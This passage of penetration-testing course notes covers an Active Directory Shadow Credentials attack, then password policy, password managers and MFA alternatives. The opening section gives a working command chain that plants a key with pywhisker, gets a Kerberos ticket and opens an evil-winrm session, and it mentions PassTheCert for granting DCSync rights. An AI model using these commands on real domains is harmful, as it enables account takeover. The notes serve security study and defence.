If you have write rights over a victim's `msDS-KeyCredentialLink`, identified in BloodHound as an `AddKeyCredentialLink` edge, plant your own key:

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u wwhite -p '<PASSWORD>' --target jpinkman --action add
# → prints a PFX file + its password
python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass '<PFX-PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/jpinkman /tmp/jpinkman.ccache
export KRB5CCNAME=/tmp/jpinkman.ccache
evil-winrm -i dc01.<DOMAIN> -r <DOMAIN>       # if the victim is in Remote Management Users
```

If the KDC lacks PKINIT support for the victim, PassTheCert can authenticate directly to LDAPS with the certificate to change passwords or grant DCSync rights.

## Password Policies

A password policy includes:

* **Definition** — Rules for creation, storage, rotation, and transmission.
* **Enforcement** — Technology such as AD Password Policy GPO and communicated processes.

Standards include:

* NIST SP800-63B
* CIS Password Policy Guide
* PCI DSS

Modern guidance recommends disabling periodic expiration. Forced rotation encourages predictable changes:

```
Inlanefreight01! → Inlanefreight02! → Inlanefreight03!
```

Blacklist in policy:

* Company name
* Company-related words
* Months and seasons
* Welcome or password variants
* Obvious passwords such as `password` and `123456`

Strong passwords include generated passwords:

```
CjDC2x[U
```

Or long passphrases:

```
()The name of my dog is Popy!
```

Attackers can OSINT passphrase ingredients.

## Password Managers

The average person has \~100 passwords, which drives password reuse.

Password managers store credentials in an encrypted database protected by a master password, using KDFs and salts.

### Cloud password managers

* 1Password
* Bitwarden
* Dashlane
* Keeper
* LastPass
* NordPass
* RoboForm

They synchronize across devices with zero-knowledge designs. Bitwarden derives a master key from the master password using a KDF, stores a separate authentication hash for the server, and derives decryption keys for vault items.

### Local password managers

* KeePass
* KWalletManager
* Pleasant Password Server
* Password Safe

These use similar cryptography but keep database storage on the local machine.

### Feature checklist

* 2FA
* Multi-platform support
* Browser extension
* Autocomplete
* Import/export
* Password generation

## Alternatives Beyond Passwords

* MFA
* FIDO2, including YubiKey
* OTP/TOTP
* IP restrictions
* Device compliance with Intune or Workspace ONE
* Passwordless systems from Microsoft, Auth0, Okta, and Ping

These shift authentication toward possession and inherent factors rather than knowledge factors.
